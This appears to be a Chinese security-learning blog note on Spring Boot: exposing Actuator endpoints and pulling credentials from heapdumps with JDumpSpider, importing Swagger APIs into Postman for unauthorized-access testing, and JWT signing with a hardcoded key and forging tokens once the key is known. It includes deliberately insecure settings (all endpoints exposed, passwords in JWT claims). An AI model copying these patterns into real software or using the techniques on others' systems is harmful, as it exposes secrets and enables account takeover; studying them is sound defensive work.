title="JavaEE应用&amp;SpringBoot框架&amp;Actuator监控泄漏&amp;Swagger自动化"></a>JavaEE应用&amp;SpringBoot框架&amp;Actuator监控泄漏&amp;Swagger自动化</h3><ol><li><p>SpringBoot-监控系统-Actuator</p><p> <a href="https://blog.csdn.net/drnrrwfs/article/details/125242990">Spring Boot Actuator 漏洞复现合集_springboot actuator 漏洞-CSDN博客</a></p><p> 1、<strong>创建项目</strong></p><p> <img src="/assets/image-20240718004127-5zim7dw.png" alt="image">​</p><p> <img src="/assets/image-20240718004139-p14fa2q.png" alt="image">​</p><p> 2、<strong>配置监控</strong></p><ul><li><p>application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 设置Spring Boot应用的端口为8001</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8001</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 指定数据库连接的URL，使用MySQL数据库，连接本地主机（localhost）的3306端口上的名为dome01的数据库</span><br><span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:mysql://localhost:3306/dome01</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 设置数据库的用户名为root</span><br><span class="hljs-attr">spring.datasource.name</span>=<span class="hljs-string">root</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 设置数据库的密码为root</span><br><span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string">root</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 指定MySQL数据库的JDBC驱动程序的类名</span><br><span class="hljs-attr">spring.datasource.driver-class-name</span>=<span class="hljs-string">com.mysql.jdbc.Driver</span><br><br><span class="hljs-attr">**#</span> <span class="hljs-string">启用所有的Actuator端点，允许通过HTTP访问监控和管理端点</span><br><span class="hljs-attr">management.endpoints.web.exposure.include</span>=<span class="hljs-string">*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 在健康检查端点中显示详细信息，包括应用程序的各个健康指标</span><br><span class="hljs-attr">management.endpoint.health.show-details</span>=<span class="hljs-string">always**</span><br></code></pre></td></tr></table></figure></li><li><p>application.yml</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">management</span>:<span class="hljs-string"></span><br>  <span class="hljs-attr">endpoints</span>:<span class="hljs-string"></span><br>    <span class="hljs-attr">web</span>:<span class="hljs-string"></span><br><span class="hljs-comment">      # 允许通过HTTP访问所有的Actuator端点</span><br>      <span class="hljs-attr">exposure</span>:<span class="hljs-string"></span><br>        <span class="hljs-attr">include</span>: <span class="hljs-string">&#x27;*&#x27;</span><br></code></pre></td></tr></table></figure></li></ul><p> <img src="/assets/image-20240718005404-2k9kliy.png" alt="image">​</p><p> 根据Actuator断点图能暴露出很多敏感信息</p><p> <strong>安全配置</strong>：在 application.properties 进行如下配置，关闭某些端点的启用，防止敏感信息泄露</p><p> 从这里也可以看出来，&#x2F;actuator&#x2F;env 和 &#x2F;actuator&#x2F;heapdump 这两个目录下爆出来信息是很敏感</p><ul><li><p>application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 启用或禁用Env端点，false表示禁用</span><br><span class="hljs-attr">management.endpoint.env.enabled</span>=<span class="hljs-string">false</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"># 启用或禁用Heap Dump端点，false表示禁用</span><br><span class="hljs-attr">management.endpoint.heapdump.enabled</span>=<span class="hljs-string">false</span><br></code></pre></td></tr></table></figure></li><li><p>application.yml</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">management</span>:<span class="hljs-string"></span><br>  <span class="hljs-attr">endpoint</span>:<span class="hljs-string"></span><br><span class="hljs-comment">    # 启用或禁用Heap Dump端点，false表示禁用</span><br>    <span class="hljs-attr">heapdump</span>:<span class="hljs-string"></span><br>      <span class="hljs-attr">enabled</span>: <span class="hljs-string">false # 启用接口关闭</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    # 启用或禁用Env端点，false表示禁用</span><br>    <span class="hljs-attr">env</span>:<span class="hljs-string"></span><br>      <span class="hljs-attr">enabled</span>: <span class="hljs-string">false # 启用接口关闭</span><br></code></pre></td></tr></table></figure></li></ul><p> 3、图像化Server&amp;Client端界面</p><p> 服务端-Server搭建</p><p> <img src="/assets/image-20240718011126-e5xsa9w.png" alt="image">​</p><p> <img src="/assets/image-20240718011403-zryieki.png" alt="image">​</p><p> 客户端-client搭建</p><p> <img src="/assets/image-20240718011441-5wth8pi.png" alt="image">​</p><ul><li><p>application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># åºç¨æå¡ WEB è®¿é®ç«¯å£</span><br><span class="hljs-comment">#访问端口</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8889</span><br><br><span class="hljs-attr">spring.boot.admin.client.url</span>=<span class="hljs-string">http://127.0.0.1:8888</span><br><span class="hljs-comment">#启用所有的Actuator端点，允许通过HTTP访问监控和管理端点</span><br><span class="hljs-attr">management.endpoints.web.exposure.include</span>=<span class="hljs-string">*</span><br><span class="hljs-comment">#在健康检查端点中显示详细信息，包括应用程序的各个健康指标</span><br><span class="hljs-attr">management.endpoint.health.show-details</span>=<span class="hljs-string">always</span><br></code></pre></td></tr></table></figure></li></ul><p> 分别启动两个项目文件</p><p> <img src="/assets/image-20240718012134-3u9cxa4.png" alt="image">​</p><p> <img src="/assets/image-20240718013930-539d5fp.png" alt="image">​</p><p> 4、heapdump泄漏</p><p> 得到<strong>对应heapdump包</strong>可以使用工具进行分析：获取到配置信息&#x3D;&#x3D;（&#x3D;&#x3D;​&#x3D;&#x3D;<strong>分析提取出敏感信息（配置帐号密码，接口信息 数据库 短信 云应用等配置）</strong>&#x3D;&#x3D;</p><p> <img src="/assets/image-20240718014533-vhuk6im.png" alt="image">​</p><p> <img src="/assets/image-20240718014646-m23s7wu.png" alt="image">​</p><p> 工具使用</p><ul><li><p>官方工具—jvisualvm分析器</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">安装jdk自带，文件搜索获取<br>如：C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Java\jdk1.8.0_112\bin\jvisualvm.exe</span><br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240718014845-1tlhha9.png" alt="image">​</p><p><img src="/assets/image-20240718014853-cxfqj8s.png" alt="image">​</p></li><li><p>其它工具—JDumpSpider提取器<a href="https://github.com/whwlsfb/JDumpSpider/releases">https://github.com/whwlsfb/JDumpSpider/releases</a></p><p><code>java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</code>​</p><p><img src="/assets/image-20240718015108-ikkxmse.png" alt="image">​</p><p><img src="/assets/image-20240718015602-b7ufv9e.png" alt="image">​</p></li></ul></li><li><p>Swagger&amp;&amp;自动化</p><p> 1、创建项目引入依赖</p><p> <img src="/assets/image-20240718015934-ab43w6r.png" alt="image">​</p><blockquote><p>2.X版本启动需要注释 <strong>@EnableSwagger2</strong></p><p><img src="/assets/image-20240718021151-dxk44ab.png" alt="image">​</p><p>3.X版本不需注释，写的话是 <strong>@EnableOpenApi</strong><br>2.X访问路径：<a href="http://ip:port">http://ip:port</a> <strong>&#x2F;swagger-ui.html</strong><br>3.X访问路径：<a href="http://ip:port">http://ip:port</a> <strong>&#x2F;swagger-ui&#x2F;index.html</strong></p></blockquote> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;--2.9.2版本--&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240718020858-18tmvcb.png" alt="image">​</p><p> <img src="/assets/image-20240718020948-rweg74t.png" alt="image">​</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;--3.0.0版本--&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240718020504-oj05crc.png" alt="image">​</p><p> <img src="/assets/image-20240718020626-uxyypaq.png" alt="image">​</p><p> 2、配置访问</p><ul><li><p>application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 设置路径匹配策略为Ant路径匹配器</span><br><span class="hljs-attr">spring.mvc.pathmatch.matching-strategy</span>=<span class="hljs-string">ant-path-matcher</span><br></code></pre></td></tr></table></figure></li><li><p>application.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">pathmatch:</span><br>      <span class="hljs-comment"># 设置路径匹配策略为Ant路径匹配器</span><br>      <span class="hljs-attr">matching-strategy:</span> <span class="hljs-string">ant_path_matcher</span><br></code></pre></td></tr></table></figure></li></ul><p> 3、自动化测试</p><p> 自动化测试：Postman<br> &#x3D;&#x3D;泄漏应用接口：用户登录，信息显示，上传文件等&#x3D;&#x3D;<br> &#x3D;&#x3D;可用于对未授权访问，信息泄漏，文件上传等安全漏洞的测试.&#x3D;&#x3D;</p><ul><li>打开postman打开工作台，在左侧找到API</li><li>打开API导入生成的<strong>swagger页面提供的API：</strong>​<a href="http://127.0.0.1:8002/v2/api-docs">http://127.0.0.1:8002/v2/api-docs</a></li><li>导入成功后点击<strong>Api Documentation，点击右侧的运行，勾选想要测试的接口，执行即可</strong></li></ul><p> <img src="/assets/image-20240718021611-6kpwyo5.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-SpringBoot框架-JWT身份鉴权-打包部署JAR-WAR"><a href="#JavaEE应用-SpringBoot框架-JWT身份鉴权-打包部署JAR-WAR" class="headerlink" title="JavaEE应用&amp;SpringBoot框架&amp;JWT身份鉴权&amp;打包部署JAR&amp;WAR"></a>JavaEE应用&amp;SpringBoot框架&amp;JWT身份鉴权&amp;打包部署JAR&amp;WAR</h3><ol><li><p>JWT身份鉴权</p><p> 1、创建项目，引入依赖</p><p> <img src="/assets/image-20240718180613-fm94g6i.png" alt="image">​</p><p> <img src="/assets/image-20240718180646-gvqt2bw.png" alt="image">​</p><p> <img src="/assets/image-20240718180814-fymj7dn.png" alt="image">​</p><p> 2、创建，配置以及解析JWT</p><p> 对应目录下创建<code>JwtController.java</code>​</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.xiaodi.testjwt.demos.web;<br><br><span class="hljs-keyword">import</span> com.auth0.jwt.JWT;<br><span class="hljs-keyword">import</span> com.auth0.jwt.JWTVerifier;<br><span class="hljs-keyword">import</span> com.auth0.jwt.algorithms.Algorithm;<br><span class="hljs-keyword">import</span> com.auth0.jwt.interfaces.DecodedJWT;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JwtController</span> &#123;<br><br>    <span class="hljs-comment">//模拟用户的jwt身份创建 数据的jwt加密</span><br>    <span class="hljs-meta">@PostMapping(&quot;/jwtcreate&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">main</span><span class="hljs-params">(Integer id,String user,String pass)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jwttoken</span> <span class="hljs-operator">=</span> JWT.create()<br>                <span class="hljs-comment">//设置创建的头部部分</span><br>                <span class="hljs-comment">//.withHeader()</span><br><br>                <span class="hljs-comment">//设置创建的payload部分</span><br>                .withClaim(<span class="hljs-string">&quot;userid&quot;</span>, id)<br>                .withClaim(<span class="hljs-string">&quot;username&quot;</span>, user)<br>                .withClaim(<span class="hljs-string">&quot;password&quot;</span>, pass)<br><br>                <span class="hljs-comment">//设置时效（JWT过期时间）</span><br>                <span class="hljs-comment">//.withExpiresAt()</span><br><br>                <span class="hljs-comment">//创建设置的signature部分，算法和密匙</span><br>                .sign(Algorithm.HMAC256(<span class="hljs-string">&quot;xiaodisec&quot;</span>));<br>        System.out.println(jwttoken);<br>        <span class="hljs-keyword">return</span> jwttoken;<br>    &#125;<br><br>    <span class="hljs-comment">//模拟JWT身份的检测 jwt数据解密</span><br>    <span class="hljs-meta">@PostMapping(&quot;/jwtcheck&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">jwtcheck</span><span class="hljs-params">(String jwtdata)</span> &#123;<br>        <span class="hljs-comment">//String jwtdata=&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6ImExMjM0NTYiLCJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiYWRtaW4ifQ.nkMIxHJKyGAHa3aDtTAy5_9j51yWDTQHEL8n-dqE33w&quot;;</span><br><br>        <span class="hljs-comment">//构建解密注册</span><br>        <span class="hljs-type">JWTVerifier</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> JWT.require(Algorithm.HMAC256(<span class="hljs-string">&quot;xiaodisec&quot;</span>)).build();<br><br>        <span class="hljs-comment">//解密注册数据</span><br>        <span class="hljs-type">DecodedJWT</span> <span class="hljs-variable">verify</span> <span class="hljs-operator">=</span> jwt.verify(jwtdata);<br><br>        <span class="hljs-comment">//提取注册解密数据 payload部分</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">userid</span> <span class="hljs-operator">=</span> verify.getClaim(<span class="hljs-string">&quot;userid&quot;</span>).asInt();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> verify.getClaim(<span class="hljs-string">&quot;username&quot;</span>).asString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> verify.getClaim(<span class="hljs-string">&quot;password&quot;</span>).asString();<br><br>        <span class="hljs-comment">//提取header部分</span><br>        <span class="hljs-comment">//verify.getHeader();</span><br>        <span class="hljs-comment">//提取sign签名部分</span><br>        <span class="hljs-comment">//verify.getSignature();</span><br><br>        System.out.println(userid + username + password);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;admin page&quot;</span>;<br><br><span class="hljs-comment">//        // 如果需要根据解密的数据执行不同的逻辑，可以使用以下代码进行判断</span><br><span class="hljs-comment">//        if(username.equals(&quot;admin&quot;))&#123;</span><br><span class="hljs-comment">//            return &quot;admin&quot;;</span><br><span class="hljs-comment">//        &#125;else &#123;</span><br><span class="hljs-comment">//            return &quot;gay?&quot;;</span><br><span class="hljs-comment">//        &#125;</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p> 3、配置前端提交数据访问客户端页面</p><ul><li><p>在resources→static→index.html创建如下的前端页面</p><p><img src="/assets/image-20240718181427-o1eal7z.png" alt="image">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>hello word!!!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>this is an HTML page<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Form for creating JWT --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;../jwtcreate&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        id:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        user:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        pass:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;create&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Form for checking JWT --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;../jwtcheck&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        jwtdata:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jwtdata&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;check&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>对应输入id，用户名，密码，点击create得到eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.q__DmCYaffqXmQweBgITek-NmhsSAhgwExNA3lQspQk<br>​<img src="/assets/image-20240718181515-ribus8p.png" alt="image">​</p></li><li><p>在官网（<a href="jwt.io">jwt.io</a>）进行解密</p><p><img src="/assets/image-20240718181637-z5li4lq.png" alt="image">​</p></li><li><p>跳转至解密成功页面，回显admin page</p><p><img src="/assets/image-20240718181718-a4ve0p5.png" alt="image">​</p></li></ul><p> 4、安全问题</p><p> <img src="/assets/image-20240718181834-cqow4r2.png" alt="image">​</p><p> 只有jwt编码，在jwt官网进行修改用户参数信息，<strong>没有使用密匙加密</strong></p><ol><li><p>报错令牌无效</p><p> <img src="/assets/image-20240718181905-9zp49xt.png" alt="image">​</p><p> <img src="/assets/image-20240718181918-mcxo372.png" alt="image">​</p></li></ol><p> 输入密匙，在此修改用户信息</p><ol><li><p>成功登入</p><p> <img src="/assets/image-20240718181958-7lztiqq.png" alt="image">​</p><p> <img src="/assets/image-20240718182006-mgl7aml.png" alt="image">​</p><p> <img src="/assets/image-20240718182013-5u83dzd.png" alt="image">​</p></li></ol></li><li><p>打包部署</p><ol><li><p>jar打包</p><p> ①jar类型项目<br> jar类型项目使用SpringBoot打包插件打包时，会在打成的jar中内置tomcat的jar。<br> 所以使用jdk直接运行jar即可，jar项目中功能将代码放到其内置的tomcat中运行。</p><p> Jar打包</p><p> 报错解决：<a href="https://blog.csdn.net/wobenqingfeng/article/details/129914639">https://blog.csdn.net/wobenqingfeng/article/details/129914639</a>​<a href="https://blog.csdn.net/Mrzhuangr/article/details/124731024">https://blog.csdn.net/Mrzhuangr/article/details/124731024</a></p><p> <img src="/assets/image-20240718190749-guyn9q2.png" alt="image">​</p><ul><li><p>将<code>&lt;skip&gt;true&lt;/skip&gt;</code>​修改为<code>&lt;skip&gt;false&lt;/skip&gt;</code>​ 即可</p><p><img src="/assets/image-20240718191118-x0u7t3r.png" alt="image">​</p><ul><li><p><code>&lt;configuration&gt;</code>: Maven 插件配置的根元素，其中包含了配置的具体内容。</p></li><li><p><code>&lt;mainClass&gt;</code>: 指定了 Java 应用程序的主类。在这里，<code>com.example.testjwt.TestJwtApplication</code>​ 被指定为主类，表明这是应用程序的入口点。</p></li><li><p><code>&lt;skip&gt;</code>: 用于控制插件的执行是否跳过。在这里，设置为 true，表示跳过执行。这可能是因为在某些情况下，你可能希望避免执行特定插件，例如在特定配置下或者在某些阶段跳过构建过程。</p></li></ul></li></ul><p> 1、maven-clean-package</p><p> <img src="/assets/image-20240718190949-gwur4du.png" alt="image">​</p><p> 2、java -jar xxxxxx.jar</p><p> <img src="/assets/image-20240718191138-c3853r2.png" alt="image">​</p></li><li><p>war打包</p><p> ②war类型项目<br> 在打包时需要将内置的tomcat插件排除，配置servlet的依赖和修改pom.xml，<br> 然后将war文件放到tomcat安装目录webapps下,启动运行tomcat自动解析即可。</p><p> War打包</p><p> 1、pom.xml加入或修改：<br>  <strong>&lt;packaging&gt;war&lt;&#x2F;packaging&gt;</strong></p><p> <img src="/assets/image-20240718191258-zt7c9t0.png" alt="image">​</p><p> 2、启动类里面加入配置：</p><p> <img src="/assets/image-20240718191447-b0iwqgw.png" alt="image">​</p><p> 3、maven-clean-package</p><p> 如果遇到下图所示报错</p><p> <img src="/assets/image-20240718191604-2dknv3e.png" alt="image">​</p><p> <img src="/assets/image-20240718191630-fxc8hwo.png" alt="image">​</p><p> 4、将打包好的war文件放在<code>D:\apache-tomcat-9.0.74\webapps\</code>​路径下然后再双击启动<code>D:\apache-tomcat-9.0.74\bin\startup.bat</code>​就会发现在<code>D:\apache-tomcat-9.0.74\webapps\</code>​多出一个war文件名称的目录（假如文件名为222.war则会生成一个名为222的目录）又因为apache-tomcat的默认端口为8080，所以此时访问127.0.0.1:8080&#x2F;222就能成功部署</p></li><li><p>直接解压放到idea中，自动反编译源码</p></li></ol></li></ol><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>安全开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息打点🧐</title>
    <link href="/2024/06/30/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/"/>
    <url>/2024/06/30/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/</url>
    
